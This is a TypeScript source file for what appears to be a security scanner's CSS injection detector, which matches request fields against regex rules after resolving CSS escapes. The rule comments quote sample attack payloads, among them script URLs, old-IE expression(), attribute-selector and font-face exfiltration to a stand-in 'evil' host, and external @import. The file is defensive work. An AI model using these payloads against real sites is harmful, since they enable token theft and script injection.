import { RequestField } from '@tessera/shared/contracts';
import { Tool, ToolCategory, ToolContextType, ToolResult, clip, safe, suspicious } from '@tessera/core/static-analysis/shared';

interface CssRule {
    name: string;
    pattern: RegExp;
}

const MAX_LENGTH = 16_384;

// Applied after CSS escapes are resolved, so "\65 xpression(" and "ex/**/pression(" read as "expression(".
// No g flags, so RegExp.test has no lastIndex state on these shared constants.
const RULES: CssRule[] = [
    {
        // width: expression(alert(1))   (old IE)
        name: 'css_expression',
        pattern: /\bexpression\s*\(/i,
    },
    {
        // background: url(javascript:alert(1))   url("vbscript:...")
        name: 'script_url',
        pattern: /\burl\s*\(\s*['"]?\s*(?:javascript|vbscript|data:text\/html)\s*:/i,
    },
    {
        // behavior: url(x.htc)   -moz-binding: url(x.xml#xss)
        name: 'binding_or_behavior',
        pattern: /\bbehavior\s*:|-moz-binding\s*:/i,
    },
    {
        // input[name=csrf][value^="a"] { background: url(https://evil/?a) }   -- one request per guessed prefix
        name: 'attribute_selector_exfiltration',
        pattern: /\[\s*[\w-]+\s*[\^$*|~]?=\s*['"]?[^\]]*\][^{]*\{[^}]*\burl\s*\(/i,
    },
    {
        // @import url(https://evil/x.css)   @import "//evil/x.css"
        name: 'external_import',
        pattern: /@import\s+(?:url\s*\(\s*)?['"]?\s*(?:https?:)?\/\//i,
    },
    {
        // @font-face { src: url(https://evil/?c=a); unicode-range: U+0061 }   -- leaks which characters are on the page
        name: 'font_face_exfiltration',
        pattern: /@font-face\s*\{[^}]*unicode-range[^}]*\}|@font-face\s*\{[^}]*src\s*:[^}]*https?:\/\/[^}]*unicode-range/i,
    },
    {
        // </style><script>   -- leaving the style context altogether
        name: 'style_breakout',
        pattern: /<\/\s*style\b|<\s*script\b/i,
    },
];

export default class CssInjection extends Tool<ToolContextType.Field> {
    constructor() {
        super({
            id: 'css_injection',
            displayName: 'CSS injection',
            category: ToolCategory.Injection,
            contextType: ToolContextType.Field,
        });
    }

    override run(context: RequestField): ToolResult {
        if (typeof context.value !== 'string') {
            return safe(this.tool);
        }

        const value = CssInjection.unescape(context.value.slice(0, MAX_LENGTH));
        const matched = RULES.filter(rule => rule.pattern.test(value)).map(rule => rule.name);

        return matched.length > 0
            ? suspicious(this.tool, { name: clip(context.name), location: context.location, rules: matched })
            : safe(this.tool);
    }

    // Resolves CSS hex escapes ("\65 " -> "e"), drops comments and backslashes before plain letters.
    private static unescape(css: string): string {
        return css
            .replace(/\/\*[\s\S]*?\*\//g, '')
            .replace(/\\([0-9a-f]{1,6})\s?/gi, (_, hex: string) => {
                const code = parseInt(hex, 16);
                return code > 0 && code <= 0x10ffff ? String.fromCodePoint(code) : '';
            })
            .replace(/\\(.)/g, '$1');
    }
}
